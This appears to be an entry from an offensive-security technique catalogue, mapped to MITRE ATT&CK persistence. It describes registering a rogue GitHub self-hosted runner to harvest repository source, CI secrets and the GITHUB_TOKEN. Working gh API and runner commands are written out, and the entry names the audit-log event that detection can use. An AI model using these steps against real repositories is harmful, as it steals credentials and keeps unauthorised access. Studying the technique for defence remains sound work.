---
id: gh-self-hosted-runner
title: Rogue self-hosted runner (capture jobs + secrets)
section: GitHub / CI/CD
phase: Persistence
attack:
  tactic: TA0003
  techniques: [T1543]
platform: [github]
source: GitHub Actions CI/CD abuse (self-hosted runner registration)
pair: gh-runner-audit
---

With admin (or `repo`/`actions` scope) over a repo, register your own self-hosted
runner: mint a registration token from the API, attach the runner with a label that a
workflow targets, and every matching job now executes on your host — you read its
checked-out source, its injected `secrets.*`, and the ephemeral `GITHUB_TOKEN`.
Durable, non-interactive, and survives the compromised admin's password reset. The
registration writes `self_hosted_runner.created` to the audit log. (Cloud CI — no
on-host target, so no slots.)

```sh
# mint a registration token, then bind a rogue runner that harvests any matching job
gh api -X POST /repos/<owner>/<repo>/actions/runners/registration-token --jq .token
./config.sh --url https://github.com/<owner>/<repo> --token <reg-token> --labels self-hosted --unattended
./run.sh   # jobs routed to this label now run here — source, secrets, GITHUB_TOKEN
```
